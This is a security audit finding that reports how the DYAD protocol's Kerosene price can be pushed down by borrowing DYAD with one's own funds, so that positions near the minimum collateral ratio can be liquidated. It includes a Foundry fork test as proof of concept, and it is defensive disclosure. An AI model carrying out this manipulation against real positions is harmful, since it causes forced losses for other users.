# The Kerosine can be manipulated downwards with own funds

## Impact
The price of kerosine can't be trusted. Users with kerosine collateral can be liquidated if close but still above the minimum CR.

## Severity
Likelihood: High - There are no preconditions.
Impact: High - Core invariant broken.
Severity: High

The protocol states that for this codebase "The main reason is the need for a flash loan protection which makes it harder to manipulate the deterministic Kerosene price". This finding shows that the kerosine price can be manipulated downwards with own funds.

## Description
In VaultManagerV2.sol#L143 we have a condition to revert withdrawals if the deposit was made in the same block. This stops users from depositing and withdrawing in the same block to manipulate the price of kerosine.

However, the formula to calculate the price of kerosine in Vault.kerosine.unbounded.sol#L67 is based on both the TVL of the non-kerosine vaults and the DYAD supply. If a user has a large enough position, they can manipulate the price of kerosine downwards with their own funds by borrowing DYAD.

Manipulators risk no funds, as they can just borrow DYAD and repay it in the same transaction. Their only cost is the opportunity cost that of keeping collateral in the protocol.

The position holder can keep a large position without debt to artificially inflate the price of kerosine. Then, as users depend on this inflated price and create positions, the manipulator can calculate when anyone is close enough to the minimum CR so that they can borrow to the necessary level to liquidate the victim.

Given that [DYAD has a $23M TVL](https://defillama.com/protocol/dyad), attackers with as little as $1M can have a sizable impact on the price of kerosine.

## Proof of Concept
Insert the following test into `test/fork/v2.t.sol`, and run it on a mainnet fork:

```
  function testMintLowersKerosinePrice_Debug() public {
    // We license the vault manager to be able to mint DYAD
    vm.prank(MAINNET_OWNER);
    Licenser(contracts.vaultLicenser).add(address(contracts.vaultManager));

    // Add the vault manager to the OLD licenser to allow minting DYAD
    vm.prank(MAINNET_OWNER);
    Licenser(0xd8bA5e720Ddc7ccD24528b9BA3784708528d0B85).add(address(contracts.vaultManager));

    DNft dNft = DNft(MAINNET_DNFT);
    
    // We reset the DNft contract to be able to mint free DNfts
    vm.etch(address(MAINNET_DNFT), address(new DNft()).code);
    dNft = DNft(MAINNET_DNFT);

    // We patch the Unbounded Kerosine Vault so that it doesn't count the v1 DYAD
    vm.etch(
      address(contracts.unboundedKerosineVault),
      address(
        new UnboundedKerosineVaultFixed(
          contracts.vaultManager,
          Kerosine(MAINNET_KEROSENE), 
          Dyad    (MAINNET_DYAD),
          contracts.kerosineManager
        )
      ).code
    );

    uint id = dNft.mintNft(address(this));

    // Obtain weth
    vm.prank(MAINNET_WETH); // deal not working for me
    ERC20(MAINNET_WETH).transfer(address(this), 1 ether);

    // Add the weth vault and deposit 1 eth    
    contracts.vaultManager.add(id, address(contracts.ethVault));
    ERC20(MAINNET_WETH).approve(address(contracts.vaultManager), 1 ether);
    contracts.vaultManager.deposit(id, address(contracts.ethVault), 1 ether);

    // Measure kerosine price at rest
    uint kerosinePriceBefore = contracts.unboundedKerosineVault.assetPrice();
    console2.log("Kerosine price at rest: %s", displayDecimals(kerosinePriceBefore, 18));

    // Mint dyad
    contracts.vaultManager.mintDyad(id, 1000 ether, address(this));

    // Lowered kerosine price
    uint kerosinePriceAfter = contracts.unboundedKerosineVault.assetPrice();
    console2.log("Kerosine price after mint: %s", displayDecimals(kerosinePriceAfter, 18));

    // Success!
    assertLt(kerosinePriceAfter, kerosinePriceBefore);
  }
```

The test will succeed, having lowered the kerosine price.

```

## Recommendation
I can't think of a great solution for this, short of implementing a TWAP for kerosine. Even in that case, the malicious whale could keep their debt for a few blocks to wait for the price to drop.
